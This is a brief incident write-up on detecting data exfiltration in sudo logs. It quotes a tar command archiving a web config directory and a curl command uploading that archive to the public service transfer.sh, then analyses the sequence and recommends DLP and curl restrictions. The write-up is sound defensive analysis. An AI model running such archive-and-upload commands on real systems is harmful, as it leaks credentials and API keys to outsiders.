# Case Study 05: Data Exfiltration Detection — Unauthorized Archive Transfer

## 1. Executive Summary
During a review of sudo execution logs, I identified a highly suspicious sequence of commands where a user archived sensitive configuration directories and attempted to transfer the resulting file to an external public file-sharing service.

## 2. Evidence (Raw Logs)
Critical commands identified in the user's session:


Feb 16 19:05:01 srv-web sudo: developer : COMMAND=/usr/bin/tar -czf /tmp/backup_site.tar.gz /var/www/html/config/
Feb 16 19:06:10 srv-web sudo: developer : COMMAND=/usr/bin/curl -F "file=@/tmp/backup_site.tar.gz" [http://transfer.sh/](http://transfer.sh/)

## 3. Technical Analysis & Investigation
Phase 1: Suspicious Archiving
Observation: The user developer archived the /var/www/html/config/ directory.
Conclusion: This directory typically contains database credentials, API keys, and sensitive environment variables. Creating a compressed archive in /tmp is a common step before exfiltration.

Phase 2: Unauthorized Data Transfer
Observation: The user used curl to upload the archive to transfer.sh, a public file-sharing platform.
Conclusion: This is a clear case of Data Exfiltration. The attacker (or a malicious insider) used an external service to bypass internal download restrictions and steal sensitive configuration data.

## 4. Security Recommendations
DLP (Data Loss Prevention): Implement monitoring for large file uploads to external domains.
Endpoint Control: Restrict the use of tools like curl or wget for non-administrative users.
